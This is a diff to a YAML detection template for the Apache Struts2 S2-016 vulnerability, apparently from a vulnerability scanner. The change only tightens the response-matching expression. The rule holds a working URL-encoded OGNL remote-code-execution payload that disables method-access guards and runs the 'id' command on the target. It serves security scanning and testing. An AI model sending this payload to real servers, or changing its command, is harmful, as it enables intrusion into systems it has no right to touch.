@@ -6,7 +6,7 @@ rules:
       redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23genxor%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23genxor.println%28%23d%29%2C%23genxor.flush%28%29%2C%23genxor.close%28%29%7D
     follow_redirects: true
     expression: |
-      status==200 && body.bcontains(b'uid')
+      status==200 && body.bcontains(b'uid=(') && body.bcontains(b'gid=(') && body.bcontains(b'groups=(') 
 detail:
   author: 0clay
   vulhub: https://vulhub.org/#/environments/struts2/s2-016/
